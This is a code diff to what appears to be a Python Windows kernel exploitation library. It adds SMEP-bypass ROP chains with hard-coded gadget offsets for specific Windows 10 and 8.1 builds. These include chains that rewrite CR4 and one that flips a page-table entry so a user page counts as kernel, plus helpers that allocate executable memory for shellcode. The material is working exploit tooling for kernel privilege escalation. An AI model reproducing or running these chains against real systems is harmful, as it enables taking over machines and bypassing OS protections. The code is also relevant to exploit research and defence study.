@@ -745,7 +745,100 @@ def make_memory_executable_palette(manager_palette, worker_palette, virtual_addr
 	tobe_pte_value = c_ulonglong(current_pte_value.value & 0x0fffffffffffffff)
 	write_memory_palette(manager_palette, worker_palette, pte_address, byref(tobe_pte_value), sizeof(tobe_pte_value));
 
-	
+#########################################################################################
+#################This section contains SMEP bypass related functions#####################
+#########################################################################################
+
+def get_smep_rop1_offsets():
+	"""
+	This function returns offsets to support the ROP chain which change the value in CR4
+	@return: offsets
+	"""
+	p = platform.platform()
+	if p == 'Windows-10-10.0.16299':
+		pop_rcx_ret = 0x160580
+		mov_cr4_rcx_ret = 0x41f901
+	elif p == 'Windows-8.1-6.3.9600':
+		pop_rcx_ret = 0x20b29
+		mov_cr4_rcx_ret = 0x8655a
+	else:
+		print "[-] Offsets are not currently available for this platform, exiting..."
+		sys.exit(-1)
+	return (pop_rcx_ret, mov_cr4_rcx_ret)
+
+def get_smep_rop2_offsets():
+	"""
+	This function returns offsets to support the ROP chain which sets a user mode page to be in kernel (supervisory)
+	@return: offsets
+	"""
+	p = platform.platform()
+	if p == 'Windows-10-10.0.16299':
+		pop_rcx_ret = 0x23ed				#s hal L7f000 59 c3
+		pop_rax_ret = 0xbb9e				#s hal L7f000 58 c3
+		mov_byte_ptr_rax_cl_ret = 0x9820	#s hal L7f000 88 08
+		wbinvd_ret = 0x415f0				#s hal L7f000 0f 09 c3
+	else:
+		print "[-] Offsets are not currently available for this platform, exiting..."
+		sys.exit(-1)
+	return (pop_rcx_ret, pop_rax_ret, mov_byte_ptr_rax_cl_ret, wbinvd_ret)
+
+def disable_smep_cr4_rop(kernel_base, return_address):
+	"""
+	This function creates a ROP chain to disable SMEP in the CR4 register
+	@param kernel_base: base address of the kernel
+	@param return_address: address to return to after the ROP chain completes
+	@return: ROP chain
+	"""
+	(pop_rcx_ret, mov_cr4_rcx_ret) = get_smep_rop1_offsets()
+	rop =  struct.pack("<Q", kernel_base+pop_rcx_ret)		# pop rcx ; ret
+	rop += struct.pack("<Q", 0x506f8)					# (popped into rcx)
+	rop += struct.pack("<Q", kernel_base+mov_cr4_rcx_ret)		# mov cr4, rcx ; ret
+	if return_address != None:
+		rop += struct.pack("<Q", return_address)			# (return into shellcode)
+	return rop
+
+def enable_smep_cr4_rop(kernel_base, return_address):
+	"""
+	This function creates a ROP chain to enable SMEP in the CR4 register
+	@param kernel_base: base address of the kernel
+	@param return_address: address to return to after the ROP chain completes
+	@return: ROP chain
+	"""
+	(pop_rcx_ret, mov_cr4_rcx_ret) = get_smep_rop1_offsets()
+	rop =  struct.pack("<Q", kernel_base+pop_rcx_ret)		# pop rcx ; ret
+	rop += struct.pack("<Q", 0x1506f8)					# (popped into rcx)
+	rop += struct.pack("<Q", kernel_base+mov_cr4_rcx_ret)		# mov cr4, rcx ; ret
+	if return_address != None:
+		rop += struct.pack("<Q", return_address)			# (return into shellcode)
+	return rop
+
+def set_user_pte_kernel_rop(hal_base, va_pte, return_address):
+	"""
+	This function creates a ROP chain to set a user address to be kernel address as described here:
+	https://www.coresecurity.com/system/files/publications/2016/05/Windows%20SMEP%20bypass%20U%3DS.pdf
+	@param hal_base: base address of the hal
+	@param va_pte: the PTE address of the VA, that has to be changed from user space to kernel space
+	@param return_address: address to return to after the ROP chain completes
+	@return: ROP chain
+	"""
+	(pop_rcx_ret, pop_rax_ret, mov_byte_ptr_rax_cl_ret, wbinvd_ret) = get_smep_rop2_offsets()
+	rop = struct.pack("<Q", hal_base + pop_rcx_ret)		# pop rcx; ret
+	rop += struct.pack("<Q", 0x63)						# DIRTY + ACCESSED + R/W + PRESENT
+	rop += struct.pack("<Q", hal_base + pop_rax_ret)		# pop rax; ret
+	rop += struct.pack("<Q", va_pte)						# PTE address
+	rop += struct.pack("<Q", hal_base + mov_byte_ptr_rax_cl_ret)		# mov byte ptr [rax], cl; ret
+	rop += struct.pack("<Q", hal_base + wbinvd_ret)		# wbinvd; ret
+	rop += struct.pack("<Q", return_address)				# The return address (in user space)
+	return rop
+
+def stack_pivot_from_kernel_to_user_rop():
+	"""
+	This function creates a ROP chain to stack pivot to user space from kernel space
+	!!!!To be implemented
+	@return: ROP chain
+	"""
+	rop = ''
+	return rop
 
 #########################################################################################
 ############This section contains kernel GDI object abusing related functions############
@@ -1576,30 +1669,45 @@ def alloc_memory(base_address, input, input_size):
 	Allocate input buffer
 	"""
 	print "[*] Allocating input buffer"
-	base_address_c   = c_int(base_address)
+	if platform.architecture()[0] == '64bit':
+		if base_address == None: base_address_c = c_ulonglong(0)
+		else: base_address_c   = c_ulonglong(base_address)		
+		ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_ulonglong), c_ulong, POINTER(c_int), c_int, c_int]
+	else:
+		if base_address == None: base_address_c = c_ulonglong(0)
+		else: base_address_c = c_int(base_address)
+		ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, POINTER(c_int), c_int, c_int]
 	input_size_c = c_int(input_size)
-	ntdll.NtAllocateVirtualMemory.argtypes = [c_int,
-											  POINTER(c_int),
-											  c_ulong,
-											  POINTER(c_int),
-											  c_int,
-											  c_int]
-	dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF,
+	dwStatus = ntdll.NtAllocateVirtualMemory(-1,
 											 byref(base_address_c),
 											 0x0, 
 											 byref(input_size_c), 
 											 MEM_RESERVE|MEM_COMMIT,
 											 PAGE_EXECUTE_READWRITE)
 	if dwStatus != STATUS_SUCCESS:
-		print "[-] Error while allocating memory: %s" % dwStatus
+		print "[-] Error while allocating memory: %s" % hex(signed_to_unsigned(dwStatus))
 		getLastError()
 		sys.exit()
 	written = c_ulong()
-	alloc = kernel32.WriteProcessMemory(0xFFFFFFFF, base_address, input, len(input), byref(written))
+	alloc = kernel32.WriteProcessMemory(-1, base_address_c, input, len(input), byref(written))
 	if alloc == 0:
 		print "[-] Error while writing our input buffer memory: %s" % alloc
 		getLastError()
 		sys.exit()
+	return base_address_c
+
+def alloc_memory_virtualalloc(base_address, input, input_size):
+	print "[*] Allocating input buffer"	
+	address = kernel32.VirtualAlloc(base_address, input_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE)
+	if not address:
+		print "[-] Error allocating memory: " + getLastError()
+		sys.exit(-1)
+
+	print "[+] Input buffer allocated at: 0x%x" % address
+
+	memmove(address, input, len(input))
+	return address
+
 
 #https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py
 def find_driver_base(driver=None):
